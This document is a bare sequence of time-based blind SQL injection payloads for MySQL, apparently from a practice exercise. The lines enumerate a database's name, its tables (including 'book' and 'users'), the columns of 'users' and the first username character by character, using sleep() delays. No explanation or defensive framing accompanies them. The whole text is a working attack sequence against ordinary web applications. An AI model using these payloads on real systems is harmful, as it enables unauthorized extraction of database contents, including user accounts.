1 and if(1=1,sleep(1),1) -- +
1 and if(length(database())=11,sleep(1),1) -- +
1 and if(substr(database(),1,1)='x',sleep(1),1) -- +
1 and if(substr(database(),2,1)='i',sleep(1),1) -- +
1 and if(substr(database(),3,1)='a',sleep(1),1) -- +
1 and if(substr(database(),11,1)='n',sleep(1),1) -- +
1 and if((select count(table_name) from information_schema.tables where table_schema=database())=1,sleep(1),1) -- +
1 and if((select count(table_name) from information_schema.tables where table_schema=database())=15,sleep(1),1) -- +
1 and if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=4 ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='b' ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)='o' ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)='o' ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)='k' ,sleep(1),1) -- +
1 and if((select length(table_name) from information_schema.tables where table_schema=database() limit 14,1)=5 ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 14,1),1,1)='u' ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 14,1),2,1)='s' ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 14,1),3,1)='e' ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 14,1),4,1)='r' ,sleep(1),1) -- +
1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 14,1),5,1)='s' ,sleep(1),1) -- +
1 and if((select count(column_name) from information_schema.columns where table_name='users' and table_schema=database())=3 ,sleep(1),1) -- +
1 and if((select length(column_name) from information_schema.columns where table_name='users' and table_schema=database() limit 0,1)=2 ,sleep(1),1) -- +
1 and if(substr((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),1,1)='i',sleep(1),1) -- +
1 and if(substr((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),2,1)='d',sleep(1),1) -- +
1 and if((select count(username) from users)=13 ,sleep(1),1) -- +
1 and if(substr((select username from users limit 0,1),1,1)='a' ,sleep(1),1) -- +
1 and if(substr((select username from users limit 0,1),2,1)='d' ,sleep(1),1) -- +
1 and if(substr((select username from users limit 0,1),3,1)='m' ,sleep(1),1) -- +